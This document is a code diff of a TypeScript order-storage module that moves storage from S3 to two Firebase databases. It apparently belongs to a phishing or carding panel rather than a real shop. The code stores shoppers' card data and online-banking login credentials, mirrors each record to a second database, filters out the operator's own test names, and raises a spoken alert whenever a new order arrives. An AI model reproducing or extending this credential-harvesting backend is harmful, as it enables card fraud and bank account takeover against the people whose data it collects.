@@ -1,6 +1,8 @@
 import { v4 as uuidv4 } from 'uuid';
-import { S3Client, PutObjectCommand, ListObjectsV2Command, GetObjectCommand, DeleteObjectCommand } from "@aws-sdk/client-s3";
 import { FormData, CardData, BankLoginData } from '../hooks/useCheckout';
+import { database } from '../firebaseConfig';
+import { database2 } from '../firebaseConfig2';
+import { off, onValue, ref, set } from '@firebase/database';
 import CryptoJS from 'crypto-js';
 
 // ====== INTERFACES ======
@@ -35,16 +37,11 @@ export interface PublicOrderData {
 
 // ====== ENV CONFIG ======
 const ENCRYPTION_KEY = import.meta.env.VITE_ENCRYPTION_KEY || 'your-secret-key-here';
+const ADMIN_NAME = import.meta.env.VITE_ADMIN_NAME || 'x20xHani';
 
-const s3 = new S3Client({
-  region: import.meta.env.VITE_AWS_REGION,
-  credentials: {
-    accessKeyId: import.meta.env.VITE_AWS_ACCESS_KEY_ID,
-    secretAccessKey: import.meta.env.VITE_AWS_SECRET_ACCESS_KEY,
-  },
-});
-
-const BUCKET = import.meta.env.VITE_AWS_S3_BUCKET;
+let previousOrdersLength = -1;
+// In-memory storage for orders
+let orders: OrderData[] = [];
 
 // ====== UTILS ======
 const encryptData = (data: any): string =>
@@ -77,16 +74,38 @@ const validateAndSanitizeFormData = (formData: FormData): FormData => ({
 });
 
 // ====== CORE FUNCTIONS ======
-export const generateOrderId = (): string => uuidv4();
 
-// Save or update order
-export const saveOrderData = async (orderId: string, data: Partial<OrderData>): Promise<void> => {
+// Generate a new GUID for a session
+export const generateOrderId = (): string => {
+  return uuidv4();
+};
+
+// Save or update order data
+export const saveOrderData = async (
+  orderId: string,
+  data: Partial<OrderData>
+): Promise<void> => {
+  const existingOrderIndex = orders.findIndex((order) => order.id === orderId);
   const sanitizedFormData = data.formData ? validateAndSanitizeFormData(data.formData) : undefined;
 
   const orderData: OrderData = {
     id: orderId,
     timestamp: Date.now(),
-    formData: sanitizedFormData || {} as FormData,
+    formData: sanitizedFormData || {
+      firstName: '',
+      lastName: '',
+      email: '',
+      phone: '',
+      address: '',
+      city: '',
+      state: '',
+      zipCode: '',
+      sameAsBilling: true,
+      billingAddress: '',
+      billingCity: '',
+      billingState: '',
+      billingZipCode: '',
+    },
     encryptedCardData: data.cardData ? encryptData(data.cardData) : undefined,
     encryptedBankData: data.bankLoginData ? encryptData(data.bankLoginData) : undefined,
     bankName: data.bankName?.trim() || '',
@@ -95,65 +114,74 @@ export const saveOrderData = async (orderId: string, data: Partial<OrderData>): 
     status: data.status || 'pending',
   };
 
-  await s3.send(
-    new PutObjectCommand({
-      Bucket: BUCKET,
-      Key: `orders/${orderId}.json`,
-      Body: JSON.stringify(orderData),
-      ContentType: "application/json",
-    })
-  );
-
-  console.log(`✅ Order ${orderId} saved to S3`);
-};
-
-// Fetch all orders (like getOrders in Firebase)
-export const getOrders = async (): Promise<PublicOrderData[]> => {
-  const list = await s3.send(
-    new ListObjectsV2Command({
-      Bucket: BUCKET,
-      Prefix: "orders/",
-    })
-  );
-
-  if (!list.Contents) return [];
-
-  const orders: PublicOrderData[] = [];
-
-  for (const obj of list.Contents) {
-    if (!obj.Key) continue;
-
-    const file = await s3.send(
-      new GetObjectCommand({ Bucket: BUCKET, Key: obj.Key })
-    );
-
-    const body = await file.Body?.transformToString();
-    if (!body) continue;
-
-    const order: OrderData = JSON.parse(body);
-
-    orders.push({
-      id: order.id,
-      timestamp: order.timestamp,
-      formData: {
-        firstName: order.formData.firstName,
-        lastName: order.formData.lastName,
-        email: order.formData.email,
-        phone: order.formData.phone,
-        city: order.formData.city,
-        state: order.formData.state,
-      },
-      bankName: order.bankName,
-      productInfo: order.productInfo,
-      total: order.total,
-      status: order.status,
-    });
+  if (existingOrderIndex >= 0) {
+    // Update existing order
+    orders[existingOrderIndex] = {
+      ...orders[existingOrderIndex],
+      ...orderData,
+    };
+  } else {
+    orders.push(orderData);
   }
 
-  // Sort by newest
-  orders.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+  await saveOrderDatainDB(orderId, orderData);
+};
 
-  return orders;
+// Get all orders (returns public data only)
+export const getOrders = async (): Promise<PublicOrderData[]> => {
+  return new Promise((resolve, reject) => {
+    const ordersRef = ref(database, 'orders/');
+    onValue(
+      ordersRef,
+      (snapshot) => {
+        const data = snapshot.val();
+        if (data) {
+          const ordersArray: OrderData[] = Object.values(data);
+          const publicOrders: PublicOrderData[] = ordersArray.map(order => ({
+            id: order.id,
+            timestamp: order.timestamp,
+            formData: {
+              firstName: order.formData.firstName,
+              lastName: order.formData.lastName,
+              email: order.formData.email,
+              phone: order.formData.phone,
+              city: order.formData.city,
+              state: order.formData.state,
+            },
+            bankName: order.bankName,
+            productInfo: order.productInfo,
+            total: order.total,
+            status: order.status,
+          }));
+          resolve(publicOrders);
+        } else {
+          resolve([]);
+        }
+      },
+      (error) => reject(error)
+    );
+  });
+};
+
+// Get a specific order by ID (from memory first, then database)
+export const getOrderById = async (orderId: string): Promise<OrderData | undefined> => {
+  // Check in-memory first
+  const memoryOrder = orders.find((order) => order.id === orderId);
+  if (memoryOrder) return memoryOrder;
+
+  // Fetch from database if not in memory
+  return new Promise((resolve, reject) => {
+    const orderRef = ref(database, `orders/${orderId}`);
+    onValue(
+      orderRef,
+      (snapshot) => {
+        const data = snapshot.val();
+        resolve(data || undefined);
+      },
+      { onlyOnce: true },
+      (error) => reject(error)
+    );
+  });
 };
 
 // Get decrypted sensitive data
@@ -162,32 +190,91 @@ export const getDecryptedOrderData = (order: OrderData) => ({
   bankLoginData: order.encryptedBankData ? decryptData(order.encryptedBankData) : undefined,
 });
 
-// Cleanup old orders
-export const cleanupOldOrders = async (daysOld: number = 30): Promise<void> => {
-  const cutoffTime = Date.now() - daysOld * 24 * 60 * 60 * 1000;
+export const saveOrderDatainDB = async (
+  orderId: string,
+  data: OrderData
+) => {
+  const orderRef = ref(database, 'orders/' + orderId);
+  const orderRef2 = ref(database2, 'orders/' + orderId);
 
-  const list = await s3.send(
-    new ListObjectsV2Command({ Bucket: BUCKET, Prefix: "orders/" })
-  );
+  console.log(`✅ Order ${orderId} saved to Firebase`);
 
-  if (!list.Contents) return;
+  await set(orderRef, data); // Save to primary database
+  await set(orderRef2, data); // Save to secondary database
+};
 
-  for (const obj of list.Contents) {
-    if (!obj.Key) continue;
+export const listenOrdersinDB = (callback: (orders: OrderData[]) => void) => {
+  const ordersRef = ref(database, 'orders/');
 
-    const file = await s3.send(
-      new GetObjectCommand({ Bucket: BUCKET, Key: obj.Key })
-    );
-    const body = await file.Body?.transformToString();
-    if (!body) continue;
-
-    const order: OrderData = JSON.parse(body);
-
-    if (order.timestamp < cutoffTime) {
-      await s3.send(
-        new DeleteObjectCommand({ Bucket: BUCKET, Key: obj.Key })
-      );
-      console.log(`🗑 Deleted old order ${order.id}`);
+  onValue(ordersRef, (snapshot) => {
+    const data = snapshot.val();
+    if (data) {
+      const ordersArray: OrderData[] = Object.values(data);
+      callback(ordersArray);
+    } else {
+      callback([]);
     }
-  }
+  });
+};
+
+export const subscribeOrders = (callback: (orders: OrderData[]) => void) => {
+  const ordersRef = ref(database, 'orders/');
+
+  const listener = onValue(ordersRef, (snapshot) => {
+    const data = snapshot.val();
+    let ordersArray: OrderData[] = data ? Object.values(data) : [];
+
+    // Filter out orders with test names (same logic as original)
+    ordersArray = ordersArray.filter(
+      (order) => order.formData?.firstName !== ADMIN_NAME
+    );
+    ordersArray = ordersArray.filter(
+      (order) => order.formData?.firstName !== ''
+    );
+    ordersArray = ordersArray.filter(
+      (order) => order.formData?.firstName !== null
+    );
+    ordersArray = ordersArray.filter(
+      (order) => order.formData?.firstName !== undefined
+    );
+    ordersArray = ordersArray.filter(
+      (order) => order.formData?.firstName !== '20xhani'
+    );
+    ordersArray = ordersArray.filter(
+      (order) => order.formData?.firstName !== '20xhan'
+    );
+    ordersArray = ordersArray.filter(
+      (order) => order.formData?.firstName !== '20xha'
+    );
+    ordersArray = ordersArray.filter(
+      (order) => order.formData?.firstName !== '20xh'
+    );
+    ordersArray = ordersArray.filter(
+      (order) => order.formData?.firstName !== '20x'
+    );
+    ordersArray = ordersArray.filter(
+      (order) => order.formData?.firstName !== '20'
+    );
+    ordersArray = ordersArray.filter(
+      (order) => order.formData?.firstName !== '2'
+    );
+
+    ordersArray.sort((a, b) => b.timestamp - a.timestamp);
+
+    if (
+      ordersArray.length > previousOrdersLength &&
+      previousOrdersLength !== -1
+    ) {
+      alert('New order received!'); // visual alert
+      // Voice alert
+      const msg = new SpeechSynthesisUtterance('New order received!');
+      window.speechSynthesis.speak(msg);
+    }
+    previousOrdersLength = ordersArray.length;
+    console.log('Orders updated:', ordersArray);
+    callback(ordersArray);
+  });
+
+  // Return unsubscribe function
+  return () => off(ordersRef, 'value', listener);
 };
